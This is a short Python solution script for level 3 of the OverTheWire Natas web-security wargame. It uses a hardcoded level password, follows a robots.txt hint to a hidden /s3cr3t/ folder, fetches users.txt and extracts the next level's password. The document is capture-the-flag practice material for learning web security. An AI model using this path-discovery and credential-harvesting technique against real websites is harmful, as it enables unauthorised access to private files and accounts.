#!/usr/bin/env python3

import requests
import re

username = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'

# first, try with robots.txt because "[...]Not even Google will find it[...]"
# you'll get a /s3cr3t/ folder :)
# url = 'http://%s.natas.labs.overthewire.org/robots.txt' % username
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username

response = requests.get(url, auth = (username, password))
content = response.text

print(re.findall('natas4:(.*)', content)[0])